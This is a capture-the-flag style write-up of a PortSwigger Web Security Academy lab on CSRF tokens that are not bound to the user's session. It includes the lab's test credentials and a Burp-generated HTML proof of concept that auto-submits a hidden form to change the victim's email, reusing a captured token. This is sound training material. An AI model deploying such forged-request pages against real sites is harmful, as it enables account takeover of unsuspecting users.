# CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------


In this case the default POST request to change the email contains a parameter “csrf”. I intercepted and dropped the request sp the CSRF token is not used, but before that I created the CSRF PoC:

Clicking "Engagement tools" > "Generate CSRF PoC", it generates an HTML PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8d002b036bf12e80d4301200d80079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test9&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="FbQyYrVpBEJETLtQVqXtlLRi69gJg3WR" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
